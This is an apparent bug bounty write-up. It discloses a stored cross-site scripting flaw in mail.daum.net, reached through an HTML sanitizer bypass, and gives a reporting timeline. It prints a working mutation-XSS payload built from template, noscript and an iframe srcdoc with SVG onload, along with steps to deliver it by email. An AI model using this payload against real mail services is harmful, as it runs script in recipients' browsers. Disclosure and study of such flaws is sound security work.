---
title: CENSORED in mail.daum.net
date: 2021-11-13 12:27:59
tags: Bug Bounty
categories: Bug Bounty
password: sxss
message: Encrypt
---
## Summary

Around 12:00 on November 13, 2021, I bypassed sanitizer and triggered the Stored XSS Vulnerability in mail.daum.net

---
## Proof of Concept
<style>
    .myvideo {
        width: auto;
        max-width: 100%;
        height: auto;
    }
</style>
<video class="myvideo" controls preload>
    <source src="https://github.com/blogpocas/DATA/raw/main/BB/Kakao/S%20XSS%20via%20Sanitizer%20Bypass%20mail.daum.net/S%20XSS.mov" type="video/mp4">
</video>


```html
<template><noscript><a title="</noscript></template><iframe srcdoc='<svg onload=top.alert(top.origin)>'></iframe>"></a></noscript></template>
```

After writing the above PoC as the content of the email, send the email, and read the email to confirm that XSS occurs. By exploiting this vulnerability, a script can be executed in the browser of any user who uses the following mail.

---
## Reporting Timeline

- 2021-11-13 13h 00m : Found a Stored Cross-Site Scripting via sanitizer bypass in mail.daum.com.
- 2021-11-13 13h 11m : Reported this issue via the Kisa.

--